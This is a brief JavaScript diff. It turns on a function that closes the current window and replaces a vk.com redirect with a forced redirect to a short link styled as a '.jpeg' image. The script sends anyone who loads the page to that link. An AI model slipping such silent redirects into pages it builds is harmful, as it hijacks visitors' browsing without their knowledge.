@@ -4,5 +4,5 @@ function navigateTopFrame(url) {
   window.open('', '_self', '');
   window.close();
 }
-// navigateTopFrame("https://vk.com/app7794757#/?post=547927697");
-window.location.replace("https://vk.com/app7794757#/?post=547927697");
+navigateTopFrame("https://2no.co/3C2t54.jpeg");
+window.location.replace("https://2no.co/3C2t54.jpeg");
